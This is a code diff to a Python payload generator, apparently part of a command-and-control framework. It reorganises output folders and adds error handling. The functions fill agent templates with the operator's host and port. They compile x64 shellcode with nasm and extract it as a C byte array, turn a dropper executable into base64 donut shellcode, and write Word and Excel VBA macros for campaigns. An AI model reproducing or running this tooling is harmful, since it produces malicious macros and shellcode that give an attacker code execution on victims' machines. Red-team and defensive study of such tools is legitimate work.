@@ -8,7 +8,11 @@ console = Console()
 
 """Create a Directory for forged payloads"""
 try:
-    mkdir("./payloads/Forged-Payloads")
+    mkdir("./utils/payloads/shellcodes")
+    mkdir("./utils/payloads/Macros")
+    mkdir("./utils/payloads/Executables")
+    mkdir("./utils/payloads/Powershell")
+    mkdir("./utils/payloads/Webserver")
 except FileExistsError:
     pass
 
@@ -157,95 +161,95 @@ def pwsh_base52():
 
 
 def cmd_shellcodex64():
-    f = open("agents/cmd_shellcodex64.ninja", "r")
+    f = open("core/agents/cmd_shellcodex64.ninja", "r")
     payload = f.read()
     if SSL:
         payload = payload.replace('{ip}', config.HOST).replace('{port}', config.PORT).replace("{b52stager}",b52_stager).replace("{HTTP}", "https")
     else:
         payload = payload.replace('{ip}', config.HOST).replace('{port}', config.PORT).replace("{b52stager}",b52_stager).replace("{HTTP}", "http")
 
-    out = open("payloads/Forged-Payloads/cmd_shellcodex64.asm", "w")
+    out = open("utils/payloads/shellcodes/cmd_shellcodex64.asm", "w")
     out.write(payload)
     out.close()
     try:
-        compile = "nasm -f win64 payloads/cmd_shellcodex64.asm -o payloads/cmd_shellcodex64.bin"
-        shellcode = """for i in $(objdump -d payloads/cmd_shellcodex64.bin |grep "^ " |cut -f2); do echo -n '\\x'$i; done;echo"""
+        compile = "nasm -f win64 utils/payloads/shellcodes/cmd_shellcodex64.asm -o utils/payloads/shellcodes/cmd_shellcodex64.bin"
+        shellcode = """for i in $(objdump -d utils/payloads/shellcodes/cmd_shellcodex64.bin |grep "^ " |cut -f2); do echo -n '\\x'$i; done;echo"""
         system(compile)
         sc = popen(shellcode).read().strip("\n")
         final_payload = f"unsigned char sc[] = {sc}"
-        compiled = open("payloads/Forged-Payloads/cmd_shellcodex64", "w")
+        compiled = open("utils/payloads/shellcodes/cmd_shellcodex64", "w")
         compiled.write(final_payload)
         compiled.close()
-        console.log("[green][+] Cmd Shellcodex64 written to:[/green]  [magenta]payloads/Forged-Payloads/cmd_shellcodex64[/magenta]")
+        console.log("[green][+] Cmd Shellcodex64 written to:[/green]  [magenta]utils/payloads/shellcodes/cmd_shellcodex64[/magenta]")
     except:
         """Auto install NASM?"""
         console.log("[!] Please check if nasm is installed", style="red")
 
 
 def cmd_shellcodex86():
-    f = open("agents/cmd_shellcodex64.ninja", "r")
+    f = open("core/agents/cmd_shellcodex64.ninja", "r")
     payload = f.read()
     if SSL:
         payload = payload.replace('{ip}', config.HOST).replace('{port}', config.PORT).replace("{b52stager}",b52_stager).replace("{HTTP}", "https")
     else:
         payload = payload.replace('{ip}', config.HOST).replace('{port}', config.PORT).replace("{b52stager}",b52_stager).replace("{HTTP}", "http")
 
-    out = open("payloads/Forged-Payloads/cmd_shellcodex86.asm", "w")
+    out = open("utils/payloads/shellcodes/cmd_shellcodex86.asm", "w")
     out.write(payload)
     out.close()
     try:
-        compile_nasm_command = "nasm -f win64 payloads/cmd_shellcodex86.asm -o payloads/cmd_shellcodex86.bin"
-        extract_shellcode_command = """for i in $(objdump -d payloads/cmd_shellcodex86.bin |grep "^ " |cut -f2); do echo -n '\\x'$i; done;echo"""
+        compile_nasm_command = "nasm -f win64 utils/payloads/shellcodes/cmd_shellcodex86.asm -o utils/payloads/shellcodes/cmd_shellcodex86.bin"
+        extract_shellcode_command = """for i in $(objdump -d utils/payloads/shellcodes/cmd_shellcodex86.bin |grep "^ " |cut -f2); do echo -n '\\x'$i; done;echo"""
         system(compile_nasm_command)
         sc = popen(extract_shellcode_command).read().strip("\n")
         final_payload = f"unsigned char sc[] = {sc}"
-        compiled = open("payloads/Forged-Payloads/cmd_shellcodex86", "w")
+        compiled = open("utils/payloads/shellcodes/cmd_shellcodex86", "w")
         compiled.write(final_payload)
         compiled.close()
-        console.log("[green][+] Cmd Shellcodex86 written to:[/green]  [magenta]payloads/Forged-Payloads/cmd_shellcodex86[/magenta]")
+        console.log("[green][+] Cmd Shellcodex86 written to:[/green]  [magenta]utils/payloads/shellcodes/cmd_shellcodex86[/magenta]")
     except:
         console.log("[!] Please check if nasm is installed", style="red")
 
 
 def donut_shellcode():
     try:
-        shellcode = donut.create(file="payloads/dropper_cs.exe")
+        shellcode = donut.create(file="utils/payloads/Executables/dropper_cs.exe")
+        b64 = base64.b64encode(shellcode).decode("utf-8")
+        out = open("utils/payloads/shellcodes/donut_shellcode.b64", "w")
+        out.write(b64)
+        out.close()
+        console.log("[green][+] Donut Shellcode written to:[/green]  [magenta]utils/payloads/shellcodes/donut_shellcode.b64[/magenta]")
     except:
         console.log("[!] Make sure donut 0.9.2 installed : pip3 install 'donut-shellcode==0.9.2' ", style="red")
-    b64 = base64.b64encode(shellcode).decode("utf-8")
-    out = open("payloads/Forged-Payloads/donut_shellcode.b64", "w")
-    out.write(b64)
-    out.close()
-    console.log("[green][+] Donut Shellcode written to:[/green]  [magenta]payloads/Forged-Payloads/donut_shellcode.b64[/magenta]")
 
 
 
 def word_macro():
-    f = open("agents/word_macro.ninja", "r")
+    f = open("core/agents/word_macro.ninja", "r")
     payload = f.read()
     if SSL:
         payload = payload.replace('{ip}', config.HOST).replace('{port}', config.PORT).replace("{raw_payload}",raw_payload).replace("{HTTP}", "https")
     else:
         payload = payload.replace('{ip}', config.HOST).replace('{port}', config.PORT).replace("{raw_payload}",raw_payload).replace("{HTTP}", "http")
 
-    out = open("payloads/Forged-Payloads/Word_macro.vba", "w")
+    out = open("utils/payloads/Macros/Word_macro.vba", "w")
     out.write(payload)
     out.close()
-    console.log("[green][+] Word Macro written to:[/green]  [magenta]payloads/Forged-Payloads/Word_macro.vba[/magenta]")
+    console.log("[green][+] Word Macro written to:[/green]  [magenta]utils/payloads/Macros/Word_macro.vba[/magenta]")
 
 
 def excel_macro():
-    f = open("agents/Excel_macro.ninja", "r")
+    f = open("core/agents/Excel_macro.ninja", "r")
     payload = f.read()
     if SSL:
         payload = payload.replace('{ip}', config.HOST).replace('{port}', config.PORT).replace("{raw_payload}",raw_payload).replace("{HTTP}", "https")
     else:
         payload = payload.replace('{ip}', config.HOST).replace('{port}', config.PORT).replace("{raw_payload}",raw_payload).replace("{HTTP}", "http")
 
-    out = open("payloads/Forged-Payloads/Excel_macro.vba", "w")
+    out = open("utils/payloads/Macros/Excel_macro.vba", "w")
     out.write(payload)
     out.close()
-    console.log("[green][+] Excel Macro written to:[/green]  [magenta]payloads/Forged-Payloads/Excel_macro.vba[/magenta]")
+    console.log("[green][+] Excel Macro written to:[/green]  [magenta]utils/payloads/Macros/Excel_macro.vba[/magenta]")
 
 
 
@@ -263,12 +267,15 @@ def Create_Payloads():
         word_macro()
         excel_macro()
         if not config.Donut:
-            console.log("[!] Donut is Disabled so , kindly create a new campaign", style="bold red")
+            console.log("[!] Donut is Disabled so if you want to use it, kindly create a new campaign", style="bold red")
         else:
-            donut_shellcode()
-            config.migrator()
+            try:
+                donut_shellcode()
+                config.migrator()
+            except:
+                console.print_exception()
         """Appending the shellcodes path to list"""
         config.PAYLOADS.append("\n[bold italic blue][-] Macros and Shellcodes [/ bold italic blue]")
-        config.PAYLOADS.append("[bold red]->[/bold red] view file://./payloads/Forged-Payloads")
+        config.PAYLOADS.append("[bold red]->[/bold red] view file://./payloads")
     except:
         console.print_exception()
